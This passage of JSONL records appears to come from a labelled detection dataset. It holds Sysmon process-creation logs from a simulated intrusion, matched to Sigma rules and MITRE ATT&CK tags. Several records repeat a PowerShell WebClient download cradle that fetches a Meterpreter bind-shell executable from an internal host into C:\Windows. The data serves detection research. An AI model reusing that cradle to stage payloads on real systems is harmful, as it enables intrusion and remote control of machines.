{4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nParentProcessId: 5232\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 5232}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 6024, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4643, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell Web Download", "authors": ["Florian Roth"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Scripts or tools that download files"], "id": "6e897651-f157-4d8f-aaeb-df8151488385", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.676+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.676Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.676\nProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nProcessId: 6024\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nParentProcessId: 5232\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 5232}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 6024, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4643, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Windows Suspicious Use Of Web Request in CommandLine", "authors": ["James Pemberton / @4A616D6573"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."], "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/", "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.676+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.676Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.676\nProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nProcessId: 6024\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nParentProcessId: 5232\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 5232}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 6024, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4643, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell DownloadFile", "authors": ["Florian Roth"], "level": "high", "source": "sigma", "status": "experimental", "falsepositives": ["Unknown"], "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"], "tags": ["attack.execution", "attack.t1059.001", "attack.command_and_control", "attack.t1104", "attack.t1105"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.676+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.688Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "7c955a0abc747f57ccc4324480737ef7", "md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.688\nProcessGuid: {4901c233-3806-63a0-5d07-000000000600}\nProcessId: 3036\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nParentProcessId: 6024\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh", "process": {"args": ["powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5d07-000000000600}", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "hash": {"md5": "04029e121a0cfa5991749937dd22a1d9", "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"}, "name": "powershell.exe", "parent": {"args": ["cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"], "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ", "entity_id": "{4901c233-3806-63a0-5c07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe", "pid": 6024}, "pe": {"imphash": "7c955a0abc747f57ccc4324480737ef7"}, "pid": 3036, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["04029e121a0cfa5991749937dd22a1d9", "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f", "7c955a0abc747f57ccc4324480737ef7"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows PowerShell", "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "PowerShell.EXE", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4644, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Non Interactive PowerShell", "authors": ["Roberto Rodriguez @Cyb3rWard0g (rule)", "oscd.community (improvements)"], "level": "low", "source": "sigma", "status": "experimental", "falsepositives": ["Legitimate programs executing PowerShell scripts"], "id": "f4bbd493-b796-416e-bbf2-121235348529", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.688+00:00", "misuse": true, "mitreattack": {"Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
